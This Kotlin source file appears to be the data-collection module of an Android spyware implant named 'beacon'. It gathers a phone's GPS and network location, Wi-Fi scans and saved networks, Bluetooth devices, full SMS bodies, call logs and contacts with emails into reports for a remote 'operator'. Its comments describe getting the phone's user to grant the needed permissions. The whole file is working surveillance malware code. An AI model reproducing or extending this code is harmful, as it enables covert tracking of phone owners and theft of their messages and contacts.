package io.umbra.beacon

import android.Manifest
import android.bluetooth.BluetoothManager
import android.content.Context
import android.content.pm.PackageManager
import android.location.Location
import android.location.LocationManager
import android.net.Uri
import android.net.wifi.WifiManager
import android.provider.ContactsContract
import java.util.concurrent.CountDownLatch
import java.util.concurrent.Executor
import java.util.concurrent.TimeUnit

/**
 * The senses of the phone: what it sees, where it is and who it talks to.
 *
 * Every collector in here answers with the truth of the phone, including
 * the parts the platform refuses to give:
 *
 *   * a runtime permission that the user did not grant is reported as
 *     "not granted", never as an empty result;
 *   * a provider that the platform locked down (the call log of a phone
 *     that is not the default dialler, the saved networks of a phone that
 *     is not the owner) is reported with the reason;
 *   * a collector that needs a moment (the location, the bluetooth
 *     discovery) waits for it and says that it waited.
 *
 * The permission model of Android is the reason for the shape of the
 * answers: the dangerous permissions are granted to the *application*,
 * not to the user of the phone, so the implant can ask for them at
 * run time and the user of the phone is the one who presses the button.
 * The guide of the host (`host.guide`) tells the operator which of them
 * are still missing.
 */
object Sense {
    /** How long a collector waits for the platform to answer. */
    const val TIMEOUT_MS = 12_000L

    /** How many rows a collector reports before it stops. */
    const val MAX_ROWS = 500

    /** The URI of the message database. */
    val SMS_URI: Uri = Uri.parse("content://sms/")

    /** The URI of the call log. */
    val CALL_LOG_URI: Uri = Uri.parse("content://call_log/calls")

    /**
     * The result of a collector: the rows, the notes and the text.
     *
     * A collector is a table, and a table that lost a column says so in
     * the notes rather than pretending the column is empty.
     */
    class Report(val kind: String) {
        private val rows = mutableListOf<List<Pair<String, String>>>()
        private val notes = mutableListOf<String>()

        /** Add one row of the table. */
        fun row(vararg fields: Pair<String, String>) {
            if (rows.size < MAX_ROWS) rows.add(fields.toList())
        }

        /** Add a note: what the platform refused, or what was waited for. */
        fun note(text: String) {
            if (text.isNotEmpty() && notes.size < 40) notes.add(text)
        }

        /** How many rows the collector found. */
        fun count(): Int = rows.size

        /** The table as text. */
        fun text(): String {
            val out = StringBuilder()
            out.append("$kind: ${rows.size} rows\n")
            for (row in rows) {
                val line = row.joinToString(" | ") { (key, value) -> "$key=$value" }
                out.append("  ").append(line).append('\n')
            }
            for (note in notes) {
                out.append("$kind: ").append(note).append('\n')
            }
            return out.toString()
        }

        /** The table as a value, so the operator can read it without the text. */
        fun value(): Upk {
            val items = rows.map { row ->
                val fields = row.map { (key, value) -> key to Upk.str(value) }
                Upk.map(*fields.toTypedArray())
            }
            return Upk.map(
                "kind" to Upk.str(kind),
                "count" to Upk.num(rows.size.toLong()),
                "rows" to Upk.Arr(items),
                "notes" to Upk.Arr(notes.map { Upk.str(it) }),
            )
        }
    }

    /**
     * Is the permission granted to the implant right now?
     *
     * The dangerous permissions of Android are granted to the application
     * and revoked by the user, so the answer changes during the
     * engagement and the collector asks every time.
     */
    fun granted(context: Context, permission: String): Boolean {
        return try {
            context.checkSelfPermission(permission) == PackageManager.PERMISSION_GRANTED
        } catch (_: Throwable) {
            false
        }
    }

    /**
     * The permissions the senses need, and whether they are granted.
     *
     * The guide shows the list, so the operator knows exactly what the
     * user of the phone still has to press.
     */
    fun permissions(context: Context): Map<String, Boolean> {
        val out = LinkedHashMap<String, Boolean>()
        out["location_fine"] = granted(context, Manifest.permission.ACCESS_FINE_LOCATION)
        out["location_coarse"] = granted(context, Manifest.permission.ACCESS_COARSE_LOCATION)
        out["wifi_state"] = granted(context, Manifest.permission.ACCESS_WIFI_STATE)
        out["bluetooth_scan"] = granted(context, Manifest.permission.BLUETOOTH_SCAN)
        out["sms_read"] = granted(context, Manifest.permission.READ_SMS)
        out["sms_receive"] = granted(context, Manifest.permission.RECEIVE_SMS)
        out["call_log"] = granted(context, Manifest.permission.READ_CALL_LOG)
        out["contacts"] = granted(context, Manifest.permission.READ_CONTACTS)
        out["microphone"] = granted(context, Manifest.permission.RECORD_AUDIO)
        out["camera"] = granted(context, Manifest.permission.CAMERA)
        out["overlay"] = granted(context, Manifest.permission.SYSTEM_ALERT_WINDOW)
        return out
    }

    // -----------------------------------------------------------------------
    // The place of the phone
    // -----------------------------------------------------------------------

    /**
     * Where the phone is.
     *
     * The last known position of the providers comes first, because it
     * is free and it is old; then the phone asks for a fresh fix and
     * waits for it.  A phone that is indoors often has no GPS fix at
     * all, so the network provider is asked as well: it is the cell the
     * phone is attached to, and the system turns it into a position.
     */
    fun location(context: Context): Report {
        val report = Report("gps.locate")
        if (!granted(context, Manifest.permission.ACCESS_FINE_LOCATION) &&
            !granted(context, Manifest.permission.ACCESS_COARSE_LOCATION)
        ) {
            report.note("the location permission is not granted: the user of the phone has to press it")
            return report
        }
        val manager = context.getSystemService(Context.LOCATION_SERVICE) as? LocationManager
        if (manager == null) {
            report.note("the phone has no location manager")
            return report
        }
        var fixed = 0
        for (provider in listOf(LocationManager.GPS_PROVIDER, LocationManager.NETWORK_PROVIDER)) {
            val last = try {
                manager.getLastKnownLocation(provider)
            } catch (e: SecurityException) {
                // The permission was checked above and can still be taken
                // away between the check and the call.
                report.note(
                    "the last known position of $provider is refused: the location permission " +
                        "is not granted (${e.message ?: "the platform refused"})",
                )
                null
            } catch (t: Exception) {
                report.note("the last known position of $provider is not readable: ${t.message}")
                null
            }
            if (last != null) {
                report.row(
                    "source" to "last_known",
                    "provider" to (last.provider ?: provider),
                    "lat" to "%.6f".format(last.latitude),
                    "lon" to "%.6f".format(last.longitude),
                    "alt" to "%.1f".format(last.altitude),
                    "speed" to "%.2f".format(last.speed),
                    "bearing" to "%.1f".format(last.bearing),
                    "accuracy" to "%.1f".format(last.accuracy),
                    "time" to "${last.time}",
                )
            }
            val fresh = freshFix(manager, provider, report)
            if (fresh != null) {
                fixed++
                report.row(
                    "source" to "fix",
                    "provider" to (fresh.provider ?: provider),
                    "lat" to "%.6f".format(fresh.latitude),
                    "lon" to "%.6f".format(fresh.longitude),
                    "alt" to "%.1f".format(fresh.altitude),
                    "speed" to "%.2f".format(fresh.speed),
                    "bearing" to "%.1f".format(fresh.bearing),
                    "accuracy" to "%.1f".format(fresh.accuracy),
                    "time" to "${fresh.time}",
                )
            }
        }
        if (fixed == 0) {
            report.note("no fresh fix: the phone may be indoors, or the location service is off")
        }
        return report
    }

    /**
     * Ask one provider for a fresh position and wait for it.
     *
     * The wait is bounded: a phone that never gets a fix must not hold
     * the beacon hostage, so the collector moves on and says so.
     */
    private fun freshFix(manager: LocationManager, provider: String, report: Report): Location? {
        val latch = CountDownLatch(1)
        var found: Location? = null
        try {
            manager.getCurrentLocation(
                provider,
                null,
                Executor { command -> command.run() },
                locationConsumer { location ->
                    if (location != null) {
                        found = location
                        latch.countDown()
                    }
                },
            )
        } catch (e: SecurityException) {
            report.note(
                "the position of $provider is refused: the location permission is not granted " +
                    "(${e.message ?: "the platform refused"})",
            )
            return null
        } catch (t: Exception) {
            report.note("the position of $provider is not readable: ${t.message}")
            return null
        }
        latch.await(TIMEOUT_MS, TimeUnit.MILLISECONDS)
        return found
    }

    /**
     * The consumer of the location callback.
     *
     * The platform takes a `java.util.function.Consumer`, which exists
     * from API 24 on; the implant needs no AndroidX for that.
     */
    private fun locationConsumer(body: (Location?) -> Unit): java.util.function.Consumer<Location> {
        return java.util.function.Consumer { location -> body(location) }
    }

    // -----------------------------------------------------------------------
    // The networks around the phone
    // -----------------------------------------------------------------------

    /**
     * The wireless networks the phone sees.
     *
     * The scan results are what the radio heard: the name of the network,
     * the address of the router, the strength of the signal and the
     * frequency.  The networks the phone was connected to before are
     * listed as well, when the platform lets an application read them --
     * since Android 10 only the owner of the profile may, and the answer
     * says so when it is not.
     */
    fun wifi(context: Context): Report {
        val report = Report("wifi.dump")
        if (!granted(context, Manifest.permission.ACCESS_WIFI_STATE)) {
            report.note("the wifi state permission is not granted")
            return report
        }
        val manager = context.getSystemService(Context.WIFI_SERVICE) as? WifiManager
        if (manager == null) {
            report.note("the phone has no wifi manager")
            return report
        }
        try {
            val info = manager.connectionInfo
            if (info != null) {
                report.row(
                    "source" to "connection",
                    "ssid" to scrubSsid(info.ssid),
                    "bssid" to (info.bssid ?: ""),
                    "rssi" to "${info.rssi}",
                    "frequency" to "${info.frequency}",
                    "link_speed" to "${info.linkSpeed}",
                )
            }
        } catch (t: Throwable) {
            report.note("the current connection is not readable: ${t.message}")
        }
        try {
            val results = manager.scanResults
            if (results == null || results.isEmpty()) {
                report.note("the radio returned no scan result: the scan may need the location permission")
            }
            for (scan in results.orEmpty()) {
                report.row(
                    "source" to "scan",
                    "ssid" to scrubSsid(scan.SSID),
                    "bssid" to (scan.BSSID ?: ""),
                    // ScanResult calls the signal strength level.
                    "rssi" to "${scan.level}",
                    "frequency" to "${scan.frequency}",
                    "capabilities" to (scan.capabilities ?: ""),
                    "timestamp" to "${scan.timestamp}",
                )
            }
        } catch (e: SecurityException) {
            // A scan result is a location, so the platform wants the
            // location permission for it; without it the call throws.
            report.note(
                "the scan results are refused: the location permission is not granted " +
                    "(${e.message ?: "the platform refused"})",
            )
        } catch (t: Exception) {
            report.note("the scan results are not readable: ${t.message}")
        }
        try {
            val configured = manager.configuredNetworks
            if (configured.isNullOrEmpty()) {
                report.note(
                    "the saved networks are not readable: since Android 10 only the owner of the profile sees them",
                )
            }
            for (network in configured.orEmpty()) {
                report.row(
                    "source" to "configured",
                    "ssid" to scrubSsid(network.SSID),
                    "bssid" to (network.BSSID ?: ""),
                )
            }
        } catch (e: SecurityException) {
            report.note(
                "the saved networks are refused: they need the location permission, which is " +
                    "not granted (${e.message ?: "the platform refused"})",
            )
        } catch (t: Exception) {
            report.note("the saved networks are not readable: ${t.message}")
        }
        return report
    }

    /** The name of a network, without the quotes the platform wraps it in. */
    private fun scrubSsid(ssid: String?): String {
        val raw = ssid ?: return ""
        return raw.trim().removeSurrounding("\"").replace("unknown ssid", "")
    }

    /**
     * The bluetooth devices around the phone.
     *
     * The paired devices are known without a scan; the discovery finds the
     * ones that answer.  A discovery takes seconds, so the phone waits
     * for it and reports what it heard.
     */
    fun bluetooth(context: Context): Report {
        val report = Report("bluetooth.scan")
        if (!granted(context, Manifest.permission.BLUETOOTH_SCAN) &&
            !granted(context, Manifest.permission.BLUETOOTH_CONNECT)
        ) {
            report.note("the bluetooth permission is not granted")
            return report
        }
        val manager = context.getSystemService(Context.BLUETOOTH_SERVICE) as? BluetoothManager
        val adapter = manager?.adapter
        if (adapter == null) {
            report.note("the phone has no bluetooth adapter")
            return report
        }
        if (!adapter.isEnabled) {
            report.note("the bluetooth radio is off")
        }
        try {
            for (device in adapter.bondedDevices.orEmpty()) {
                report.row(
                    "source" to "paired",
                    "name" to safeName { device.name },
                    "address" to (device.address ?: ""),
                    "type" to device.type.toString(),
                    "bonded" to "yes",
                )
            }
        } catch (e: SecurityException) {
            // Reading a paired device -- its name and its type -- is the
            // connect permission on Android 12 and later.
            report.note(
                "the paired devices are refused: the bluetooth connect permission is not " +
                    "granted (${e.message ?: "the platform refused"})",
            )
        } catch (t: Exception) {
            report.note("the paired devices are not readable: ${t.message}")
        }
        val found = BluetoothScan.scan(context, adapter)
        if (found.isEmpty()) {
            report.note("the discovery heard nothing: the radio may be off, or the devices do not answer")
        }
        try {
            for (device in found) {
                report.row(
                    "source" to "discovery",
                    "name" to safeName { device.name },
                    "address" to (device.address ?: ""),
                    "type" to device.type.toString(),
                    "bonded" to "no",
                )
            }
        } catch (e: SecurityException) {
            report.note(
                "the devices the discovery heard are refused: the bluetooth connect " +
                    "permission is not granted (${e.message ?: "the platform refused"})",
            )
        } catch (t: Exception) {
            report.note("the devices the discovery heard are not readable: ${t.message}")
        }
        return report
    }

    /** The name of a device, which needs a permission of its own on new phones. */
    private fun safeName(body: () -> String?): String {
        return try {
            body() ?: ""
        } catch (_: Throwable) {
            ""
        }
    }

    // -----------------------------------------------------------------------
    // The people and the words of the phone
    // -----------------------------------------------------------------------

    /**
     * The messages of the phone.
     *
     * The database holds every message the phone received or sent.  The
     * body of a message may be redacted by the platform on a phone with
     * two SIMs, and the answer says how many rows came back and how many
     * of them had a body.
     */
    fun sms(context: Context, limit: Int): Report {
        val report = Report("sms.dump")
        if (!granted(context, Manifest.permission.READ_SMS)) {
            report.note("the sms permission is not granted: the user of the phone has to press it")
            return report
        }
        val projection = arrayOf(
            "_id", "address", "body", "date", "type", "read", "thread_id",
        )
        var total = 0
        var bodies = 0
        try {
            context.contentResolver.query(
                SMS_URI,
                projection,
                null,
                null,
                "date DESC LIMIT $limit",
            )?.use { cursor ->
                val id = cursor.getColumnIndex("_id")
                val address = cursor.getColumnIndex("address")
                val body = cursor.getColumnIndex("body")
                val date = cursor.getColumnIndex("date")
                val type = cursor.getColumnIndex("type")
                val read = cursor.getColumnIndex("read")
                while (cursor.moveToNext() && total < limit) {
                    val text = if (body >= 0) cursor.getString(body) ?: "" else ""
                    if (text.isNotEmpty()) bodies++
                    report.row(
                        "id" to cursor.string(id),
                        "address" to cursor.string(address),
                        "type" to smsType(cursor.int(type)),
                        "date" to cursor.string(date),
                        "read" to cursor.string(read),
                        "body" to text,
                    )
                    total++
                }
            }
        } catch (t: Throwable) {
            report.note("the message database is not readable: ${t.message}")
        }
        report.note("read $total messages, $bodies of them with a body")
        return report
    }

    /** The name of the kind of a message. */
    private fun smsType(value: Int): String = when (value) {
        1 -> "inbox"
        2 -> "sent"
        3 -> "draft"
        4 -> "outbox"
        5 -> "failed"
        6 -> "queued"
        else -> "unknown"
    }

    /**
     * The call log of the phone.
     *
     * Since Android 10 the call log belongs to the default dialler and
     * to the carrier applications: an ordinary application asks the user
     * for the permission, and the user sees the request.  When it is
     * refused the answer says so instead of pretending the phone never
     * made a call.
     */
    fun calls(context: Context, limit: Int): Report {
        val report = Report("call.logs")
        if (!granted(context, Manifest.permission.READ_CALL_LOG)) {
            report.note("the call log permission is not granted")
            return report
        }
        val projection = arrayOf("_id", "number", "name", "duration", "date", "type")
        var total = 0
        try {
            context.contentResolver.query(
                CALL_LOG_URI,
                projection,
                null,
                null,
                "date DESC LIMIT $limit",
            )?.use { cursor ->
                val id = cursor.getColumnIndex("_id")
                val number = cursor.getColumnIndex("number")
                val name = cursor.getColumnIndex("name")
                val duration = cursor.getColumnIndex("duration")
                val date = cursor.getColumnIndex("date")
                val type = cursor.getColumnIndex("type")
                while (cursor.moveToNext() && total < limit) {
                    report.row(
                        "id" to cursor.string(id),
                        "number" to cursor.string(number),
                        "name" to cursor.string(name),
                        "duration" to cursor.string(duration),
                        "date" to cursor.string(date),
                        "type" to callType(cursor.int(type)),
                    )
                    total++
                }
            }
        } catch (t: Throwable) {
            report.note("the call log is not readable: ${t.message}")
        }
        report.note("read $total calls")
        return report
    }

    /** The name of the kind of a call. */
    private fun callType(value: Int): String = when (value) {
        1 -> "incoming"
        2 -> "outgoing"
        3 -> "missed"
        4 -> "voicemail"
        5 -> "rejected"
        6 -> "blocked"
        7 -> "answered"
        else -> "unknown"
    }

    /**
     * The address book of the phone.
     *
     * The name, the number and the address of the mail of every contact,
     * one row per contact.
     */
    fun contacts(context: Context, limit: Int): Report {
        val report = Report("contacts.dump")
        if (!granted(context, Manifest.permission.READ_CONTACTS)) {
            report.note("the contacts permission is not granted")
            return report
        }
        var total = 0
        try {
            val uri = ContactsContract.CommonDataKinds.Phone.CONTENT_URI
            val projection = arrayOf(
                ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                ContactsContract.CommonDataKinds.Phone.NUMBER,
                ContactsContract.CommonDataKinds.Phone.CONTACT_ID,
            )
            context.contentResolver.query(uri, projection, null, null, null)?.use { cursor ->
                val name = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
                val number = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
                val id = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.CONTACT_ID)
                while (cursor.moveToNext() && total < limit) {
                    report.row(
                        "id" to cursor.string(id),
                        "name" to cursor.string(name),
                        "number" to cursor.string(number),
                    )
                    total++
                }
            }
        } catch (t: Throwable) {
            report.note("the address book is not readable: ${t.message}")
        }
        try {
            val uri = ContactsContract.CommonDataKinds.Email.CONTENT_URI
            val projection = arrayOf(
                ContactsContract.CommonDataKinds.Email.DISPLAY_NAME,
                ContactsContract.CommonDataKinds.Email.ADDRESS,
            )
            context.contentResolver.query(uri, projection, null, null, null)?.use { cursor ->
                val name = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Email.DISPLAY_NAME)
                val address = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Email.ADDRESS)
                while (cursor.moveToNext() && total < limit) {
                    report.row(
                        "name" to cursor.string(name),
                        "email" to cursor.string(address),
                    )
                    total++
                }
            }
        } catch (t: Throwable) {
            report.note("the mail addresses are not readable: ${t.message}")
        }
        report.note("read $total contact records")
        return report
    }

    // -----------------------------------------------------------------------
    // The cursor helpers
    // -----------------------------------------------------------------------

    /** The string of a column, or the empty string when it is not there. */
    private fun android.database.Cursor.string(column: Int): String {
        if (column < 0) return ""
        return try {
            getString(column) ?: ""
        } catch (_: Throwable) {
            ""
        }
    }

    /** The number of a column, or -1 when it is not there. */
    private fun android.database.Cursor.int(column: Int): Int {
        if (column < 0) return -1
        return try {
            getInt(column)
        } catch (_: Throwable) {
            -1
        }
    }
}
